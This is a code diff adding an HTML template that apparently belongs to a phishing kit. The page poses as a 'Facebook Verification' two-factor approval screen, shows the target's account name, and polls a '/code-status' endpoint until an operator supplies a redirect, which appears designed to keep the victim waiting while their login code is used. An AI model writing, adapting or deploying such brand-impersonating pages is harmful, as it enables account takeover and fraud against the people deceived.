@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="<%= i18n.language %>">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Verification</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-50">
+    <div class="max-w-md mx-auto bg-white min-h-screen">
+        <div class="px-4 py-3 border-b border-gray-200">
+            <p id="headerText" class="text-sm text-gray-600"><%= t('approval.header') %></p>
+        </div>
+        <div class="px-4 py-6">
+            <h1 class="text-2xl font-semibold text-gray-900 mb-3"><%= t('approval.title') %></h1>
+            <p class="text-gray-600 mb-6"><%= t('approval.description') %></p>
+            <div class="mb-8 flex justify-center"><div class="w-full max-w-sm rounded-lg overflow-hidden"><img src="https://i.ibb.co/hJwSkrr2/IXDE-Accounts-Center-Security-Settings-2-FA-Center2-edit-mobile-light-3x.png" alt="Verificación de seguridad" class="w-full h-auto"/></div></div>
+            <div class="text-center">
+                <h2 class="text-xl font-semibold text-gray-900 mb-2"><%= t('approval.waiting') %></h2>
+                <div class="flex justify-center"><div class="animate-spin rounded-full h-6 w-6 border-b-2 border-blue-500"></div></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(location.search);
+        const user = urlParams.get("user");
+        const accountName = urlParams.get("account_name");
+
+        // =================================================================
+        // == SCRIPT PARA ACTUALIZAR EL ENCABEZADO
+        // =================================================================
+        const headerText = document.getElementById('headerText');
+        if (accountName && accountName !== 'null') {
+            headerText.textContent = `${accountName} • Facebook`;
+        }
+
+        let isNavigatingInternally = false;
+        window.addEventListener('beforeunload', () => {
+            if (!isNavigatingInternally && user) {
+                navigator.sendBeacon('/disconnect', new Blob([JSON.stringify({ user })], { type: 'application/json' }));
+            }
+        });
+
+        (function poll(){
+          if (!user) return;
+          fetch("/code-status?user="+encodeURIComponent(user))
+            .then(r => r.json())
+            .then(status => {
+                if (status.accepted && status.accepted.url_final) {
+                    isNavigatingInternally = true;
+                    window.location.href = status.accepted.url_final;
+                } else {
+                    setTimeout(poll, 2000);
+                }
+            })
+            .catch(() => setTimeout(poll, 2500));
+        })();
+    </script>
+</body>
+</html>
